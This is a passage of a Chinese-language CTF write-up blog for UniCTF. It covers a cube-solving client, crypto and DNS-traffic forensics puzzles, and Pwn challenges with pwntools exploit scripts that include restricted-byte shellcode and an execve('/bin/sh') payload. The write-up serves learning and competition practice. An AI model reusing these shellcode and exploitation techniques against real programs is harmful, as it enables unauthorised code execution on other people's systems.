猜测隐藏面</span></span><br><span class="line">    candidates = <span class="built_in">set</span>(itertools.permutations(missing))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> candidates:</span><br><span class="line">        temp = <span class="built_in">list</span>(state_builder)</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(perm): temp[unknown_idxs[i]] = val</span><br><span class="line">        start_state = <span class="built_in">tuple</span>(temp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. 剪枝：物理非法</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_cube(start_state): <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 查表：是否在预计算中? (O(1))</span></span><br><span class="line">        <span class="keyword">if</span> start_state <span class="keyword">in</span> VISITED:</span><br><span class="line">            p = get_path(start_state)</span><br><span class="line">            io.sendline(<span class="string">&quot; &quot;</span>.join(p).encode())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 补搜：运行时 BFS (Depth 4)</span></span><br><span class="line">        <span class="comment"># 预计算 7 + 运行时 4 = 11 (上帝之数)</span></span><br><span class="line">        q = collections.deque([(start_state, [], <span class="number">6</span>)])</span><br><span class="line">        seen = &#123;start_state&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> q:</span><br><span class="line">            curr, path, last_f = q.popleft()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(path) &gt;= <span class="number">4</span>: <span class="keyword">continue</span>  <span class="comment"># Max Runtime Depth</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> m_idx <span class="keyword">in</span> ALLOWED_MOVES[last_f]:</span><br><span class="line">                table = TRANSITION_TABLES[m_idx]</span><br><span class="line">                nxt = <span class="built_in">tuple</span>(curr[i] <span class="keyword">for</span> i <span class="keyword">in</span> table)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 相遇检测</span></span><br><span class="line">                <span class="keyword">if</span> nxt <span class="keyword">in</span> VISITED:</span><br><span class="line">                    part2 = get_path(nxt)</span><br><span class="line">                    full = path + [MOVES_STR[m_idx]] + part2</span><br><span class="line">                    io.sendline(<span class="string">&quot; &quot;</span>.join(full).encode())</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> nxt <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">                    seen.add(nxt)</span><br><span class="line">                    q.append((nxt, path + [MOVES_STR[m_idx]], m_idx // <span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 步骤1: 预计算 (必须等待完成)</span></span><br><span class="line">    precompute(depth=<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤2: 连接</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">37830</span>)</span><br><span class="line">        <span class="comment"># io = process([&quot;python3&quot;, &quot;app.py&quot;]) # 本地测试</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.error(<span class="string">&quot;无法连接服务器&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Solve 100 cubes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        log.info(<span class="string">f&quot;Round <span class="subst">&#123;i + <span class="number">1</span>&#125;</span>/100&quot;</span>)</span><br><span class="line">        t1 = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> solve_round(io):</span><br><span class="line">            log.error(<span class="string">&quot;Round failed or EOF&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取结果并检查 Flag</span></span><br><span class="line">            res = io.recvline().decode().strip()</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> res: res = io.recvline().decode().strip()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> res <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                log.success(<span class="string">f&quot;SUCCESS: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NmEyMDViMzg3ZDU0OTEwZDZkY2EyMjlkYjM4NTg3OGZfNHdYakJxWjkyMXlyWUZUMXBQUW1EREttTTdnekp0Ym1fVG9rZW46QVBnWWJLbE9Gb09lN0p4REpyV2NuRlJWbjhkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>111</p>
<h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTIwNGY0NzMxZjc1OWE1ODhmZGYxMWY3Mjc1MjNhNjZfenRXZDhWdWtsc2g1YkZhZmh1ZjQ2U3dYZ05Md1ptWllfVG9rZW46QmUzNmIzZUMwb3o5Q1Z4WEJDVGNmMTQwblJmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>U2VjcmV0S2V5 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTQwMWQ1YTM1YThiN2E0OWE0OWQzODI4MDgxZDYzNGJfaXM1Rk5DOEQwYnA2c2dudzNra29TWEZUY21iRzBzckJfVG9rZW46UE9YR2Jwd3drb0ZGTGh4VmgxUGN6QmFrbmlkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>base64解码得SecretKey</p>
<p>Serpent密钥需要十六进制再用0补位，得到5365637265744B657900000000000000 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDM1MmFlMzhhZTI2ZmMzOTJkNjg5ZjZjYWY5YzBkY2NfMlRFeWR1eFh2aWc5ZUVLQTlWUEFOSm1vZ3hmN1phbmdfVG9rZW46VHVXUmJMUGhkb21sNHF4N3BNN2N0SURpblNlXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>解码得flag：UniCTF{Serpentine_Secrets}</p>
<h3 id="Silent-resolver"><a href="#Silent-resolver" class="headerlink" title="Silent resolver"></a>Silent resolver</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OWU1ZTRhNWQ4Njk4MTZhMzg4Nzc4YWUxOThhNDQxYjRfRTVpVm9QZ1l0UXA2YVVZYTlUN0YyM3hqZlNnNzhMOGVfVG9rZW46VDZYaGJGT0Mwb0p5MEh4QllRVWNMQzVibkNmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>使用wireshark打开附件发现均为DNS传输且有大量网站</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTA5OTQ0ZDAwNDExYmNmMTRlOThlMDBhZWIzZGIxNDNfcUMyTnBvaVFDQVdDWTlDY3NDV2c3Wmhkcng0U2VJN21fVG9rZW46QTNkMmJqSTNHb1pOSlJ4Q3gwN2NhdjNEbmZmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>查找unictf的关键词得到几个可以字符串</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZlMTdlNGMzZDAwYWQ2YWIyZDM3YTdlZGEzZWE2NGNfZHdWb0dReThCYkw1Y0ZodjBlUks5QTRucktaZUpkeUxfVG9rZW46RjZJemJUUGVvb05ZT3B4SXY3UGNBdWZ1bkNiXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>将字符串提取出来后观察规律，发现两两相同，且前五位疑似序号</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTMzMzU1ZGJmOTdhMWRmMjk3NGY4NmJhOWUzNDM3YjJfN1ppUzB3QzZQUjV4WVFnbjFKZlNzRVZCOGpMaHI1RnpfVG9rZW46SkVvdGJheGVZb3dMeTJ4ZjBpUmM0OVZxbnNkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>将5.看为50，ffff.看为结尾后按照序号排列后续字符串，发现只有字母与2~7的数字，怀疑是base32编码，统一后解码的504B0304开头字符串504B03041400000008004865255CB6033211380000003600000008000000666C61672E7478740BCDCB740E71AB7631C82B890F2932292E8977F10B8E0F2C352E324C2D8E37CF30AE8CF7354CCF2889F7304C318E0F364E2E322E29AE0500504B010214031400000008004865255CB60332113800000036000000080000000000000000000000800100000000666C61672E747874504B05060000000001000100360000005E0000000000</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NzczYWZkNGExMTY2YzNhMjM2MTc4MDNlNzkwNDgzZTBfMW43MGhEYnFacExHMFFUMk5Udkl0MmpEeGk5ZXBLZktfVG9rZW46Q3o3UWJxd2hyb0ZwdG14ODFaaWNnU1hHbk5iXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>将其用winhex新建为zip压缩包，解压后打开文档的flag：UniCTF{D0nt_Tr4st_DNS_Qu3r1es_7h3y_M1ght_H1d3_S3cr3ts}</p>
<h3 id="截取的线索"><a href="#截取的线索" class="headerlink" title="截取的线索"></a>截取的线索</h3><p>打开附件得到一条像素宽的黑白像素点和一串密文，将图片像素点转化为二进制得010111110100011101110010011001010110000101110100010111110111010001101111001100000011000101111101再将其每八位分割转化为ascii得_Great_to01}观察已解出部分像是flag后半段，观察密文内容RinDSA|W6dlkbXsob 推测解密后为flag前段，且已知flag格式为UniCTF{}，所以推测密文中RinDSA|与UniCTF{相对应</p>
<p>将两段字符串转化为二进制得</p>
<p>1010010 1101001 1101110 1000100 1010011 1000001 1111100</p>
<p>1010101 1101110 1101001 1000011 1010100 1000110 1111011</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NGI5ZTA4NWQ2MTYxMDM2MjRlMmJjNzVkNTZiNzgxNzRfRUlJRE1Ecm1vSEo2M0s3OG1HcFE0Mnh0bkxDOUc0WmVfVG9rZW46QU0wMWJXbzZhb2ZwM2p4WVFPUWNqZ0tRbmhnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>以上七队数值XOR异或结果均为0000111由此推出W6dlkbXsob解密为P1ckle_the拼接得flag：UniCTF{P1ckle_the_Great_to01}</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="什么？我不是汇编高手吗？"><a href="#什么？我不是汇编高手吗？" class="headerlink" title="什么？我不是汇编高手吗？"></a>什么？我不是汇编高手吗？</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=M2QwYjg2MDZlYjE4ZTQ0YTk3OTk1YzY5YTE0OTYxZDdfdGJZQU0zcE4zNXpIeFB0bkxKQ1VubTNpdEFsOGlCOVlfVG9rZW46WEpJWWIwaXZYb2pRckV4MFM4UGNGMlQxbm9nXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>考察shellcode，以及汇编指令的理解，有后门函数，直接跳转即可得到 flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.c&#x27;,11525)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> a,b=<span class="literal">False</span> : p.recvuntil(a,drop=b)</span><br><span class="line">rl  = <span class="keyword">lambda</span>    :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt64</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">addr = fmt64()</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">backdoor_addr = <span class="number">0x4011F6</span></span><br><span class="line"></span><br><span class="line">sd(p32(<span class="number">1</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># Block 1: XOR EAX, EAX; NOP; OR EAX, imm32</span></span><br><span class="line"><span class="comment"># 机器码: 31 C0 90 0D ... (0D 会吃掉后面的 E9 F6 11 40)</span></span><br><span class="line">sd(<span class="string">b&#x27;\x31\xC0\x90\x0D&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Block 2: [imm32 data] + TEST AL, imm8</span></span><br><span class="line"><span class="comment"># 数据部分: F6 11 40 (配合上一条 OR 组成 0x4011F6E9)</span></span><br><span class="line"><span class="comment"># 指令部分: A8 ... (A8 会吃掉后面的 E9)</span></span><br><span class="line">sd(<span class="string">b&#x27;\xF6\x11\x40\xA8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Block 3: SHR EAX, 8; TEST AL, imm8</span></span><br><span class="line"><span class="comment"># 修正 EAX: 0x4011F6E9 &gt;&gt; 8 = 0x4011F6</span></span><br><span class="line"><span class="comment"># A8 吃掉下一个 E9</span></span><br><span class="line">sd(<span class="string">b&#x27;\xC1\xE8\x08\xA8&#x27;</span>)</span><br><span class="line"><span class="comment">#GDB(&quot;b *0x401399&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Block 4: JMP RAX</span></span><br><span class="line"><span class="comment"># 此时 RAX = 0x4011F6, 这里的跳转是绝对跳转，无视 2GB 限制</span></span><br><span class="line">sl(<span class="string">b&#x27;\xFF\xE0\x90\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="smcode"><a href="#smcode" class="headerlink" title="smcode"></a>smcode</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDdjODQyYmE3NDE4OWQ1NDY0YTRjYjZiOWNkZDhmZjlfTXNSTUdIU3puSGd2UlJseFVEZld1NnJKZUc1WkhsdnVfVG9rZW46V1dRb2JtWWNMb28zWjB4MFhSYmM2TEQ2bnBiXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>这题也是考察shellcode，但是有一些限制，字节必须要满足斐波那契数列，合理利用 rax 可以往可写可执行段后写入一些特殊的汇编指令，比如 syscall , pop rsi 等等，同时我们可以利用 and al 0 对 al 进行一个清空，这样更加方便我们布置 shellcode ，指令中间可以使用 nop 滑梯。</p>
<p>布置一个read调用，这样我们就可以实现shellcode续写。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,39002)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> a,b=<span class="literal">False</span> : p.recvuntil(a,drop=b)</span><br><span class="line">rl  = <span class="keyword">lambda</span>    :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">允许的字节: 0x00, 0x01, 0x02, 0x03, 0x05, 0x08, 0x0D, 0x15, 0x22, 0x37, 0x59, 0x90, 0xE9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">and_al_0  \x22\x03</span></span><br><span class="line"><span class="string">pop rsi \x5e</span></span><br><span class="line"><span class="string">pop rdx \x5a</span></span><br><span class="line"><span class="string">syscall \x0f\x05</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">and_al_0 = <span class="string">b&#x27;\x22\x03&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\x00\x05\x01\x01\x00\x00&#x27;</span></span><br><span class="line">shellcode += and_al_0</span><br><span class="line">shellcode += <span class="string">b&#x27;\x05\x59\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x05\x05\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x00\x05\x08\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">shellcode += and_al_0</span><br><span class="line">shellcode += <span class="string">b&#x27;\x05\x59\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x05\x01\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x00\x05\x08\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">shellcode += and_al_0</span><br><span class="line">shellcode += <span class="string">b&#x27;\x05\x05\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x00\x05\x22\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x05\x08\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x05\x02\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">12</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x00\x05\x05\x00\x00\x00&#x27;</span></span><br><span class="line">shellcode += and_al_0</span><br><span class="line">shellcode += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">3</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#GDBR(0x1461)</span></span><br><span class="line">sd(shellcode)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">shellcode = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6c</span> + <span class="string">b&quot;\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">sd(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="speak"><a href="#speak" class="headerlink" title="speak"></a>speak</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MWE5OTRiNjhhODExZTFkZDNiNTMwYTU5YTY4ZDAzYzJfUHl0VlllTmhIMHBhVnRRdFZPeW1BeENXVVh1ODF6ZVpfVG9rZW46WW93TmJEM21ob2hQZXV4c2NwNWNLQlNzbmtRXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE4YWMwOWNkZDNjYzdjNjM1YTVlMTFmMzMwYzc1OWNfRzYxY0dUVGl2c3EzcjVnU0ZkRDU1eGJkVVNSYzF4eUZfVG9rZW46UkI0T2JGaWxxb0wwaXp4azI2SGN4TzNwbkRUXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>考点是栈上的格式化字符串漏洞，Input name 这里相当于是又给了一次格式化字符串漏洞，因为溢出到了后面的welcome，这个我们可以用来泄露地址 ，然后通过劫持 printf 函数的返回地址以及rbp，实现一个栈迁移执行rop，但是这是概率事件 。</p>
